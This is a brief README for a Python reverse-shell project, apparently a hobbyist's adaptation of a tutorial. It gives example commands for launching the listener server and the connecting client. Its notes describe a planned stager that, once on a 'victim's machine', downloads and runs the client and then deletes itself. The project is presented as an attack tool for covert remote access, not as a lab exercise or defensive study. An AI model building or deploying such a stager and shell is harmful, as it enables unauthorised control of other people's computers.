# BasicReverseShell
I followed a tutorial and came up with a slightly modified version of the Python server/client. See "desc.txt"


### How to use

- Server (example)
```
python3 server.py -i -H 0.0.0.0 -p 443 -b (1024 * 998) -s "<sep>" -t 5 -p "> "
```

- Client (example -- On a test machine but, the stager will auto run the client when the project is complete)
```
python3 client.py 127.0.0.1
```

### Notes
- The client is modifiable along with the server
- The stager should be able to, once it is on the victims machine, download the client, run the client from a specific directory, auto-terminate stager
